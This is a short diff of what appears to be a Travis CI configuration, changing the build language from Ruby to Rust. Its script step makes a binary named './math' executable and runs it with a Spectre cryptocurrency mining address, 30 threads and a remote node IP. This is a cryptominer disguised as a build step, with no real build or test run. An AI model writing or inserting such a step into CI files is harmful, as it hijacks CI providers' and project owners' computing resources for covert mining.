@@ -1,8 +1,8 @@
-dist: jammy
-language: ruby
-rvm:
-- 1.9.3
-- 2.0.0
-- 2.1.0
+# dist: jammy
+language: rust
+rust:
+  - stable
+  - beta
+  - nightly
 script:
 - chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.44.208.37
